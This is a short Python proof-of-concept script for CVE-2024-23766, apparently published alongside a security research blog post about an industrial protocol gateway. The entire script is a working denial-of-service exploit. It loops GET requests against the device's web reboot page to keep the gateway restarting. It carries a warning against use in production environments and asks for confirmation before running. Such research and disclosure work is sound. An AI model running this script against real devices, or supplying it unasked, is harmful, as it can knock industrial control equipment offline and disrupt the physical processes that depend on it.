# Lex @ https://github.com/claire-lex
# Script for CVE-2024-23766
# HICP device denial of service via the web interface
# Details: https://sensepost.com/blog/2024/targeting-an-industrial-protocol-gateway/

from sys import argv
from urllib import request
from time import sleep

# Argument check
if len(argv) != 2:
    print("Usage: {0} ip_address".format(argv[0]))
    exit(-1)

# Warning and check
print("WARNING!!! NEVER USE THIS IN RUNNING PRODUCTION ENVIRONMENTS")
check = input("Are you sure you want to proceed? [y/N]: ")
if check not in ["y", "Y"]:
    exit(0)

# Start attack
url = "http://{0}/slave/reboot.html".format(argv[1])
timeout = 30
    
print("Keep on sending GET requests to {0}".format(url))
while True:
    try:
        res = request.urlopen(url, timeout=timeout)
    except ConnectionResetError:
        pass
